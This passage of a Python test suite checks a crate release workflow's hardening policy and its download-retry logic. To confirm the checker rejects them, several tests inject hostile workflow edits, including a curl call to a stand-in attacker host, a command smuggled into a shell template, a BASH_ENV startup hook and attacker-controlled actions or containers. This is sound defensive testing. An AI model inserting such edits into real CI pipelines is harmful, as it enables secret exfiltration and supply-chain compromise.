        state = self.make_release(draft=True, assets=(self.crate_name,))
        result, final_state = self.run_script(state)

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(final_state["release"]["draft"])
        upload = next(
            call for call in final_state["calls"] if call[:2] == ["release", "upload"]
        )
        self.assertIn("registry-bundle/SHA256SUMS", upload)
        self.assertNotIn(f"registry-bundle/{self.crate_name}", upload)

    def test_partial_upload_is_safe_to_retry(self) -> None:
        state = {"release": None, "upload_mode": "partial"}
        first, partial_state = self.run_script(state)

        self.assertNotEqual(first.returncode, 0)
        self.assertTrue(partial_state["release"]["draft"])
        self.assertFalse(any(call[:2] == ["release", "edit"] for call in partial_state["calls"]))

        partial_state["upload_mode"] = "success"
        second, complete_state = self.run_script(partial_state)
        self.assertEqual(second.returncode, 0, second.stderr)
        self.assertFalse(complete_state["release"]["draft"])

    def test_ambiguous_upload_response_verifies_assets_without_duplicate_upload(self) -> None:
        result, state = self.run_script(
            {"release": None, "upload_mode": "ambiguous"}
        )

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(state["release"]["draft"])
        upload_calls = [
            call for call in state["calls"] if call[:2] == ["release", "upload"]
        ]
        self.assertEqual(len(upload_calls), 1)
        self.assertEqual(
            sorted(asset["name"] for asset in state["release"]["assets"]),
            sorted(self.bundle_assets),
        )

    def test_ambiguous_publish_response_is_confirmed_by_reading_release_state(self) -> None:
        state = self.make_release(
            draft=True,
            assets=tuple(self.bundle_assets),
        )
        state["publish_mode"] = "ambiguous"
        result, final_state = self.run_script(state)

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(final_state["release"]["draft"])
        self.assertIn("checking whether GitHub published it", result.stderr)

    def test_mismatched_existing_release_fails_closed(self) -> None:
        cases = [
            ("wrong tag", {"tag_name": "v0.1.2"}, tuple(self.bundle_assets), None, None),
            ("wrong title", {"name": "unrelated"}, tuple(self.bundle_assets), None, None),
            ("wrong notes or commit marker", {"body": "old release notes"}, tuple(self.bundle_assets), None, None),
            ("wrong release type", {"prerelease": False}, tuple(self.bundle_assets), None, None),
            ("extra asset", {}, tuple(self.bundle_assets) + ("unexpected.txt",), None, None),
            ("wrong asset bytes", {}, tuple(self.bundle_assets), {self.crate_name: b"wrong crate bytes"}, None),
            ("wrong tag commit", {}, tuple(self.bundle_assets), None, "c" * 40),
        ]
        for label, overrides, assets, asset_bytes, tag_commit in cases:
            with self.subTest(case=label):
                state = self.make_release(
                    draft=True,
                    assets=assets,
                    overrides=overrides,
                    asset_bytes=asset_bytes,
                )
                if tag_commit is not None:
                    state["tag_commit"] = tag_commit
                result, final_state = self.run_script(state)

                self.assertNotEqual(result.returncode, 0)
                self.assertTrue(final_state["release"]["draft"])
                if label == "wrong tag commit":
                    self.assertTrue(
                        any(
                            call[:1] == ["api"] and "/git/tags/" in call[1]
                            for call in final_state["calls"]
                        )
                    )
                self.assertFalse(any(call[:2] == ["release", "upload"] for call in final_state["calls"]))
                self.assertFalse(any(call[:2] == ["release", "edit"] for call in final_state["calls"]))

    def test_api_errors_other_than_not_found_do_not_create_a_release(self) -> None:
        result, state = self.run_script({"release": None, "api_failure": True})

        self.assertNotEqual(result.returncode, 0)
        self.assertIsNone(state["release"])
        self.assertFalse(any(call[:2] == ["release", "create"] for call in state["calls"]))

    def test_publication_policy_requires_pre_attestation_commit_guard(self) -> None:
        mutated = self.publish_script.replace(
            '[[ "$VERIFIED_TAG_COMMIT" == "$GITHUB_SHA" ]] || {',
            "true || {",
            1,
        )

        violations = check_workflows.github_release_publication_script_violations(
            mutated
        )
        self.assertTrue(
            any("VERIFIED_TAG_COMMIT" in violation for violation in violations),
            violations,
        )

    def test_publication_policy_rejects_unreviewed_command(self) -> None:
        mutated = self.publish_script.replace(
            'release_endpoint="repos/$repo/releases/tags/$tag"',
            'gh api "repos/$repo/releases/tags/$tag" >/dev/null\n'
            'release_endpoint="repos/$repo/releases/tags/$tag"',
            1,
        )

        violations = check_workflows.github_release_publication_script_violations(
            mutated
        )
        self.assertTrue(
            any("reviewed command set" in violation for violation in violations),
            violations,
        )

    def test_failed_create_without_a_persisted_release_fails_for_retry(self) -> None:
        result, state = self.run_script(
            {"release": None, "create_mode": "fail-before"}
        )

        self.assertNotEqual(result.returncode, 0)
        self.assertIsNone(state["release"])
        self.assertIn("did not create a draft release", result.stderr)


class WorkflowDownloadTests(unittest.TestCase):
    def test_only_tls_eof_is_retried(self) -> None:
        self.assertTrue(
            check_workflows.is_transient_download_failure(
                ssl.SSLEOFError("unexpected end of file")
            )
        )
        self.assertFalse(
            check_workflows.is_transient_download_failure(
                ssl.SSLCertVerificationError("certificate verification failed")
            )
        )

    def test_download_retries_transient_transport_error_then_succeeds(self) -> None:
        archive = b"checksum-verified-by-caller"
        response = io.BytesIO(archive)
        with (
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=[
                    check_workflows.urllib.error.URLError(
                        ConnectionResetError(errno.ECONNRESET, "connection reset")
                    ),
                    check_workflows.urllib.error.URLError(
                        ConnectionResetError(errno.ECONNRESET, "connection reset")
                    ),
                    response,
                ],
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            downloaded = check_workflows.download_archive("https://example.test/archive")

        self.assertEqual(downloaded, archive)
        self.assertEqual(urlopen.call_count, 3)
        self.assertEqual(
            [call.args[0] for call in sleep.call_args_list],
            [
                check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
                2 * check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS,
            ],
        )

    def test_release_oidc_boundary_accepts_current_workflow(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml")
        self.assertEqual(
            check_workflows.release_oidc_isolation_violations(
                workflow.read_text(encoding="utf-8")
            ),
            [],
        )

    def test_release_oidc_jobs_reject_unreviewed_step_controls(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        mutations = [
            (
                "skip publisher tag verification",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        if: false\n",
            ),
            (
                "ignore publisher tag verification failure",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        continue-on-error: true\n",
            ),
            (
                "skip release attestation",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        if: false\n",
            ),
            (
                "ignore release attestation failure",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        continue-on-error: true\n",
            ),
            (
                "run tag verification despite earlier failures",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        if: always()\n",
            ),
            (
                "quoted publisher condition",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        \"if\": github.event_name == 'workflow_dispatch'\n",
            ),
            (
                "quoted publisher continue-on-error key",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        \"continue-on-error\": true\n",
            ),
            (
                "tagged publisher condition",
                "      - name: Verify the remote annotated tag still names this commit\n",
                "      - name: Verify the remote annotated tag still names this commit\n"
                "        !!str if: github.event_name == 'workflow_dispatch'\n",
            ),
            (
                "tagged attestation failure handling",
                "      - name: Attest the canonical registry archive\n",
                "      - name: Attest the canonical registry archive\n"
                "        !!str continue-on-error: true\n",
            ),
            (
                "folded authentication condition",
                "      - name: Authenticate to crates.io with OIDC\n"
                "        id: crates-io-auth\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "      - name: Authenticate to crates.io with OIDC\n"
                "        id: crates-io-auth\n"
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "          && always()\n",
            ),
            (
                "folded upload condition",
                "      - name: Upload the verified archive to crates.io\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "      - name: Upload the verified archive to crates.io\n"
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "          && always()\n",
            ),
            (
                "duplicate the publisher condition",
                "        if: steps.existing-version.outputs.present != 'true'\n",
                "        if: steps.existing-version.outputs.present != 'true'\n"
                "        if: steps.existing-version.outputs.present != 'true'\n",
            ),
        ]

        for case, old, new in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(old, new, 1)
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "github-release step controls must match the reviewed policy"
                    if (
                        "attestation" in case
                        or "tag verification despite" in case
                    )
                    else "publish step controls must match the reviewed policy",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_oidc_jobs_reject_job_level_control_overrides(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        mutations = [
            (
                "github-release always condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    if: always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "github-release ignored failures",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    continue-on-error: true\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "quoted github-release condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    \"if\": always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
            (
                "tagged github-release condition",
                "    needs: verify-registry\n    runs-on: ubuntu-24.04\n",
                "    needs: verify-registry\n    !!str if: always()\n"
                "    runs-on: ubuntu-24.04\n",
            ),
        ]

        for case, old, new in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(old, new, 1)
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "github-release job controls must match the reviewed policy",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_publisher_rejects_unreviewed_oidc_action(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "uses: rust-lang/crates-io-auth-action@",
            "uses: attacker/crates-io-auth-action@",
            1,
        )

        self.assertIn(
            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_rejects_an_unreviewed_action_revision(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        prefix, publisher = workflow.split("  publish:", 1)
        unsafe = prefix + "  publish:" + publisher.replace(
            "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333",
            "actions/download-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            1,
        )

        self.assertIn(
            "publish may use only the reviewed artifact and crates.io OIDC action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_workflow_rejects_global_write_all_permissions(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "permissions:\n  contents: read\n",
            "permissions: write-all\n",
            1,
        )

        self.assertIn(
            "release workflow must use only the reviewed top-level contents: read permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_repository_code_jobs_reject_write_all_permissions(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
            "    needs: [preflight, release-coverage]\n"
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
            "    permissions:\n      contents: read\n",
            "  prepare-publish:\n    name: Prepare the verified crates.io request\n"
            "    needs: [preflight, release-coverage]\n"
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 45\n"
            "    permissions: write-all\n",
            1,
        )

        self.assertIn(
            "prepare-publish must use its reviewed least-privilege permissions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_oidc_jobs_reject_runner_and_shell_overrides(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "env:\n  CARGO_TERM_COLOR: always\n",
            "defaults:\n  run:\n    shell: 'bash -c \"echo injected; bash {0}'\n"
            "\nenv:\n  CARGO_TERM_COLOR: always\n",
            1,
        )
        unsafe = unsafe.replace(
            "  publish:\n    name: Publish the verified archive to crates.io\n"
            "    needs:",
            "  publish:\n    name: Publish the verified archive to crates.io\n"
            "    container: attacker.invalid/runner:latest\n    needs:",
            1,
        )

        violations = check_workflows.release_oidc_isolation_violations(unsafe)
        self.assertIn(
            "release workflow must not override default shell execution", violations
        )
        self.assertIn(
            "publish must not override its runner, shell, or environment", violations
        )

    def test_workflow_shell_defaults_reject_alternate_yaml_keys(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        shell_default = (
            "  run:\n"
            "    shell: 'bash -c \"echo injected; bash {0}'\n"
        )
        mutations = [
            (
                "explicit defaults key",
                "? defaults\n:\n" + shell_default + "\nenv:\n",
            ),
            (
                "tagged defaults key",
                "!!str defaults:\n" + shell_default + "\nenv:\n",
            ),
            (
                "quoted defaults key",
                "\"defaults\":\n" + shell_default + "\nenv:\n",
            ),
        ]

        for case, replacement in mutations:
            with self.subTest(case=case):
                unsafe = workflow.replace(
                    "env:\n  CARGO_TERM_COLOR: always\n",
                    replacement + "  CARGO_TERM_COLOR: always\n",
                    1,
                )
                self.assertNotEqual(unsafe, workflow)
                self.assertIn(
                    "release workflow must not override default shell execution",
                    check_workflows.release_oidc_isolation_violations(unsafe),
                )

    def test_release_workflow_environment_rejects_shell_startup_hooks(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n',
            '  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"\n'
            "  BASH_ENV: scripts/attacker.sh\n",
            1,
        )

        self.assertIn(
            "release workflow environment must not add execution hooks",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_github_release_requires_verified_registry_bytes(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "    needs: verify-registry\n",
            "    needs: publish\n",
            1,
        )

        self.assertIn(
            "github-release must follow registry byte verification",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_oidc_steps_reject_custom_shell_templates(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        prefix, publisher = workflow.split("  publish:", 1)
        before_tag, tag_step = publisher.split(
            "name: Verify the remote annotated tag still names this commit", 1
        )
        tag_step = tag_step.replace(
            "        shell: bash\n",
            "        shell: 'bash -c \"echo injected; bash {0}'\n",
            1,
        )
        unsafe = prefix + "  publish:" + before_tag + (
            "name: Verify the remote annotated tag still names this commit" + tag_step
        )

        self.assertIn(
            "publish must use only the reviewed step shells",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_rejects_extra_command_in_tag_check(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        safe_command = (
            '          echo "verified annotated tag ${GITHUB_REF_NAME} at ${tag_commit}"\n'
        )
        unsafe = workflow.replace(
            safe_command,
            safe_command + "          curl https://attacker.invalid/collect\n",
            1,
        )

        self.assertIn(
            "publish shell steps must match the reviewed static command set",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_github_release_rejects_unreviewed_attestation_action(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "uses: actions/attest@",
            "uses: attacker/attest@",
            1,
        )

        self.assertIn(
            "github-release may use only the reviewed artifact and attestation action revisions",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_package_preparation_cannot_receive_oidc_permission(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "  prepare-publish:\n    name:",
            "  prepare-publish:\n    permissions:\n      id-token: write\n    name:",
            1,
        )

        self.assertIn(
            "prepare-publish must not have OIDC token permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_publisher_cannot_checkout_or_run_cargo(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "      - name: Verify publish request checksum\n",
            "      - uses: actions/checkout@1234567890abcdef1234567890abcdef12345678\n"
            "      - name: Build after OIDC permission is granted\n"
            "        run: cargo package --locked\n"
            "      - name: Verify publish request checksum\n",
            1,
        )

        violations = check_workflows.release_oidc_isolation_violations(unsafe)
        self.assertIn(
            "publish must not check out or execute repository source", violations
        )
        self.assertIn(
            "publish must not run Cargo or repository-controlled scripts", violations
        )

    def test_release_publisher_requires_tag_check_before_oidc(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "name: Verify the remote annotated tag still names this commit",
            "name: Omit remote annotated tag verification",
            1,
        )

        self.assertIn(
            "publish must recheck the remote annotated tag",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_crates_io_token_is_rejected_at_job_scope(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "    needs: [preflight, release-coverage, prepare-publish]\n",
            "    needs: [preflight, release-coverage, prepare-publish]\n"
            "    env:\n"
            "      CRATES_IO_PUBLISH_TOKEN: ${{ steps.crates-io-auth.outputs.token }}\n",
            1,
        )

        self.assertIn(
            "crates.io credentials must not be job-scoped",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_verification_script_cannot_run_after_attestation(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        safe_command = '          if ! gh release create "$tag" --repo "$repo" \\\n'
        unsafe = workflow.replace(
            safe_command,
            "          python3 scripts/verify_release_tag.py\n" + safe_command,
            1,
        )

        self.assertIn(
            "github-release must not execute repository code with OIDC permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_release_job_cannot_run_repository_code_before_attestation(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml").read_text(
                        encoding="utf-8"
                    )
        unsafe = workflow.replace(
            "      - name: Verify canonical registry checksum\n",
            "      - name: Verify canonical registry checksum\n"
            "        run: python3 scripts/verify_release_tag.py\n",
            1,
        )

        self.assertIn(
            "github-release must not execute repository code with OIDC permission",
            check_workflows.release_oidc_isolation_violations(unsafe),
        )

    def test_download_retries_transient_http_error_then_succeeds(self) -> None:
        url = "https://example.test/archive"
        error_body = io.BytesIO(b"temporary error response")
        unavailable = check_workflows.urllib.error.HTTPError(
            url, 503, "Service Unavailable", {}, error_body
        )
        archive = b"release archive"
        with (
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=[unavailable, io.BytesIO(archive)],
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            downloaded = check_workflows.download_archive(url)

        self.assertEqual(downloaded, archive)
        self.assertEqual(urlopen.call_count, 2)
        self.assertTrue(error_body.closed)
        sleep.assert_called_once_with(check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS)

    def test_download_does_not_retry_permanent_http_error(self) -> None:
        for status, reason in ((404, "Not Found"), (501, "Not Implemented")):
            with self.subTest(status=status):
                error_body = io.BytesIO(b"permanent error response")
                error = check_workflows.urllib.error.HTTPError(
                    "https://example.test/archive", status, reason, {}, error_body
                )
                with (
                    patch.object(
                        check_workflows.urllib.request, "urlopen", side_effect=error
                    ) as urlopen,
                    patch.object(check_workflows.time, "sleep") as sleep,
                ):
                    with self.assertRaises(check_workflows.urllib.error.HTTPError):
                        check_workflows.download_archive(
                            "https://example.test/archive"
                        )

                self.assertEqual(urlopen.call_count, 1)
                self.assertTrue(error_body.closed)
                sleep.assert_not_called()

    def test_download_stops_after_the_configured_attempts(self) -> None:
        with (
            patch.object(check_workflows, "DOWNLOAD_ATTEMPTS", 2),
            patch.object(
                check_workflows.urllib.request,
                "urlopen",
                side_effect=check_workflows.urllib.error.URLError(
                    TimeoutError("temporary failure")
                ),
            ) as urlopen,
            patch.object(check_workflows.time, "sleep") as sleep,
        ):
            with self.assertRaises(check_workflows.urllib.error.URLError):
                check_workflows.download_archive("https://example.test/archive")

        self.assertEqual(urlopen.call_count, 2)
        sleep.assert_called_once_with(check_workflows.DOWNLOAD_RETRY_BACKOFF_SECONDS)

    def test_checksum_mismatch_still_rejects_downloaded_archive(self) -> None:
        with patch.object(
            check_workflows.urllib.request,
            "urlopen",
            return_value=io.BytesIO(b"untrusted archive"),
        ) as urlopen:
            downloaded = check_workflows.download_archive(
                "https://example.test/archive"
            )

        with self.assertRaisesRegex(ValueError, "checksum mismatch"):
            check_workflows.binary_bytes(downloaded, "0" * 64)
        urlopen.assert_called_once()


class WorkflowArchiveCacheTests(unittest.TestCase):
    @staticmethod
    def make_archive(binary: bytes = b"verified actionlint binary") -> bytes:
        archive = io.BytesIO()
        with tarfile.open(fileobj=archive, mode="w:gz") as contents:
            member = tarfile.TarInfo("actionlint")
            member.size = len(binary)
            contents.addfile(member, io.BytesIO(binary))
        return archive.getvalue()

    def test_corrupt_cache_is_discarded_and_replaced_by_verified_download(self) -> None:
        url = "https://example.test/actionlint.tar.gz"
        downloaded = self.make_archive()
        checksum = hashlib.sha256(downloaded).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            archive.write_bytes(b"interrupted archive write")
            with patch.object(
                check_workflows, "download_archive", return_value=downloaded
            ) as download:
                executable = check_workflows.cached_actionlint_binary(
                    archive, url, checksum
                )

            self.assertEqual(executable, b"verified actionlint binary")
            self.assertEqual(archive.read_bytes(), downloaded)
            self.assertEqual(list(Path(directory).iterdir()), [archive])
            download.assert_called_once_with(url)

    def test_invalid_download_is_rejected_and_not_cached(self) -> None:
        url = "https://example.test/actionlint.tar.gz"
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            archive.write_bytes(b"corrupt cache")
            with patch.object(
                check_workflows, "download_archive", return_value=b"untrusted archive"
            ) as download:
                with self.assertRaisesRegex(ValueError, "checksum mismatch"):
                    check_workflows.cached_actionlint_binary(archive, url, "0" * 64)

            self.assertFalse(archive.exists())
            download.assert_called_once_with(url)

    def test_archive_cache_write_uses_same_directory_atomic_replace(self) -> None:
        data = self.make_archive()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "archive.tar.gz"
            original_replace = os.replace
            with patch.object(
                check_workflows.os, "replace", wraps=original_replace
            ) as replace:
                check_workflows.write_archive_atomically(archive, data)

            source, destination = replace.call_args.args
            self.assertEqual(Path(source).parent, archive.parent)
            self.assertEqual(Path(destination), archive)
            self.assertEqual(archive.read_bytes(), data)
            self.assertFalse(Path(source).exists())


class BenchmarkOracleArchiveTests(unittest.TestCase):
    def test_valid_cache_is_reused_without_a_network_request(self) -> None:
        archive_data = b"verified benchmark oracle archive"
        checksum = hashlib.sha256(archive_data).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            archive.write_bytes(archive_data)
            with (
                patch.object(setup_benchmark_oracle, "SHA256", checksum),
                patch.object(setup_benchmark_oracle.urllib.request, "urlopen") as urlopen,
            ):
                setup_benchmark_oracle.ensure_archive(archive)

        urlopen.assert_not_called()

    def test_corrupt_cache_is_replaced_by_a_verified_download_atomically(self) -> None:
        archive_data = b"verified benchmark oracle archive"
        checksum = hashlib.sha256(archive_data).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            archive.write_bytes(b"interrupted archive write")
            real_replace = os.replace

            def verify_atomic_replace(
                source: str | os.PathLike[str],
                destination: str | os.PathLike[str],
            ) -> None:
                temporary = Path(source)
                self.assertEqual(temporary.parent, archive.parent)
                self.assertEqual(Path(destination), archive)
                self.assertFalse(archive.exists())
                self.assertEqual(temporary.read_bytes(), archive_data)
                real_replace(source, destination)

            with (
                patch.object(setup_benchmark_oracle, "SHA256", checksum),
                patch.object(
                    setup_benchmark_oracle.urllib.request,
                    "urlopen",
                    return_value=io.BytesIO(archive_data),
                ) as urlopen,
                patch.object(
                    setup_benchmark_oracle.os,
                    "replace",
                    side_effect=verify_atomic_replace,
                ),
            ):
                setup_benchmark_oracle.ensure_archive(archive)

            self.assertEqual(archive.read_bytes(), archive_data)
            self.assertEqual(list(Path(directory).iterdir()), [archive])
            urlopen.assert_called_once()
            request = urlopen.call_args.args[0]
            self.assertEqual(request.full_url, setup_benchmark_oracle.URL)
            self.assertEqual(urlopen.call_args.kwargs["timeout"], 60)

    def test_transient_http_and_network_errors_use_bounded_backoff(self) -> None:
        archive_data = b"verified benchmark oracle archive"
        checksum = hashlib.sha256(archive_data).hexdigest()
        timeout = urllib.error.URLError(TimeoutError("temporary connection timeout"))
        unavailable = urllib.error.HTTPError(
            setup_benchmark_oracle.URL,
            503,
            "Service Unavailable",
            {},
            io.BytesIO(b"temporary error"),
        )
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            with (
                patch.object(setup_benchmark_oracle, "SHA256", checksum),
                patch.object(
                    setup_benchmark_oracle.urllib.request,
                    "urlopen",
                    side_effect=[timeout, unavailable, io.BytesIO(archive_data)],
                ) as urlopen,
                patch.object(setup_benchmark_oracle.time, "sleep") as sleep,
            ):
                setup_benchmark_oracle.ensure_archive(archive)

            self.assertEqual(archive.read_bytes(), archive_data)
            self.assertEqual(urlopen.call_count, 3)
            self.assertEqual(
                [call.args[0] for call in sleep.call_args_list], [1, 2]
            )

    def test_truncated_content_length_response_retries_before_caching(self) -> None:
        archive_data = b"verified benchmark oracle archive"
        checksum = hashlib.sha256(archive_data).hexdigest()

        class Response(io.BytesIO):
            def __init__(self, body: bytes, content_length: int) -> None:
                super().__init__(body)
                self.headers = {"Content-Length": str(content_length)}

        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            with (
                patch.object(setup_benchmark_oracle, "SHA256", checksum),
                patch.object(
                    setup_benchmark_oracle.urllib.request,
                    "urlopen",
                    side_effect=[
                        Response(archive_data[:8], len(archive_data)),
                        Response(archive_data, len(archive_data)),
                    ],
                ) as urlopen,
                patch.object(setup_benchmark_oracle.time, "sleep") as sleep,
            ):
                setup_benchmark_oracle.ensure_archive(archive)

            self.assertEqual(archive.read_bytes(), archive_data)
            self.assertEqual(list(Path(directory).iterdir()), [archive])
            self.assertEqual(urlopen.call_count, 2)
            sleep.assert_called_once_with(1)

    def test_close_delimited_truncated_response_retries_before_caching(self) -> None:
        archive_data = b"verified benchmark oracle archive"
        checksum = hashlib.sha256(archive_data).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            with (
                patch.object(setup_benchmark_oracle, "SHA256", checksum),
                patch.object(
                    setup_benchmark_oracle.urllib.request,
                    "urlopen",
                    side_effect=[
                        io.BytesIO(archive_data[:8]),
                        io.BytesIO(archive_data),
                    ],
                ) as urlopen,
                patch.object(setup_benchmark_oracle.time, "sleep") as sleep,
            ):
                setup_benchmark_oracle.ensure_archive(archive)

            self.assertEqual(archive.read_bytes(), archive_data)
            self.assertEqual(list(Path(directory).iterdir()), [archive])
            self.assertEqual(urlopen.call_count, 2)
            sleep.assert_called_once_with(1)

    def test_permanent_http_error_is_not_retried(self) -> None:
        for status in (404, 501):
            with self.subTest(status=status), tempfile.TemporaryDirectory() as directory:
                archive = Path(directory) / "oracle.tar.gz"
                error = urllib.error.HTTPError(
                    setup_benchmark_oracle.URL,
                    status,
                    "permanent failure",
                    {},
                    io.BytesIO(b"error response"),
                )
                with (
                    patch.object(
                        setup_benchmark_oracle.urllib.request,
                        "urlopen",
                        side_effect=error,
                    ) as urlopen,
                    patch.object(setup_benchmark_oracle.time, "sleep") as sleep,
                ):
                    with self.assertRaises(urllib.error.HTTPError):
                        setup_benchmark_oracle.download_archive(archive)

                self.assertFalse(archive.exists())
                self.assertEqual(list(Path(directory).iterdir()), [])
                urlopen.assert_called_once()
                sleep.assert_not_called()

    def test_checksum_invalid_download_is_retried_and_never_cached(self) -> None:
        archive_data = b"unverified benchmark oracle archive"
        with tempfile.TemporaryDirectory() as directory:
            archive = Path(directory) / "oracle.tar.gz"
            archive.write_bytes(b"corrupt cached archive")
            with (
                patch.object(setup_benchmark_oracle, "SHA256", "0" * 64),
                patch.object(
                    setup_benchmark_oracle.urllib.request,
                    "urlopen",
                    side_effect=[
                        io.BytesIO(archive_data)
                        for _ in range(setup_benchmark_oracle.DOWNLOAD_ATTEMPTS)
                    ],
                ) as urlopen,
